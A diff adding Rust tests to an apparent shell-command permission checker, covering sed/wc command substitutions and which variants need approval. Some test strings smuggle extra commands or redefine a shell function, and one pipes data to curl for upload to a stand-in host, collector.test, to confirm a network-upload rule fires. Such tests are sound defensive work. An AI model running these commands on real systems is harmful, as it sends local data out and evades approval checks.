@@ -32,6 +32,46 @@ fn unknown_native_tail_has_only_read_effects_without_scalar_claim() {
         check(text, Decision::Allow);
     }
 }
+
+#[test]
+fn line_count_quit_keeps_possible_inputs_for_every_ifs_layout() {
+    let command = "printf '%s\n' fixture | sed $(wc -l < ./line-count-input)q";
+    let mut core = ShellQueryCore::new();
+    let result = core.check(request(command));
+    assert_eq!(result.decision, Decision::Allow, "{:?}", result.reasons);
+    assert!(result.decision_trace.execution_semantics.iter().any(|fact| {
+        fact.normalized_command_name == "sed" && !fact.operation_semantics_unresolved
+    }));
+    let graph = core.session_graph(&request("").session_id).unwrap();
+    assert!(graph.edges().iter().any(|edge| {
+        edge.kind == EdgeKind::Reads
+            && matches!(&graph.get_node(&edge.to).unwrap().kind,
+                NodeKind::PathFact { resolution: PathResolution::UnsupportedDynamicText { text }, .. }
+                    if text.contains("wc -l"))
+    }), "the dynamic file-read input must remain in the graph");
+}
+
+#[test]
+fn line_count_quit_does_not_certify_other_producers_or_expanded_scripts() {
+    for command in [
+        "sed $(wc -l ./line-count-input)q",
+        "sed $(wc -l < ./line-count-input)qx",
+        "sed $(wc -l < ./line-count-input)q ./other",
+        "sed $(wc --help < ./line-count-input)q",
+        "sed $(wc -l < ./line-count-input 2>&1)q",
+        "sed $(wc -l < ./line-count-input; printf marker)q",
+        "wc() { printf marker; }; sed $(wc -l < ./line-count-input)q",
+    ] {
+        check(command, Decision::NeedApproval);
+    }
+    let upload = check(
+        "sed $(wc -l < ./line-count-input)q | curl -q --data-binary @- https://collector.test",
+        Decision::NeedApproval,
+    );
+    assert!(upload.decision_trace.findings.iter()
+        .any(|finding| finding.rule_id == RuleId::NetworkUpload));
+}
+
 #[test]
 fn explicit_stdin_lists_preserve_filename_bytes_and_indirect_reads() {
     let mut core = ShellQueryCore::new();
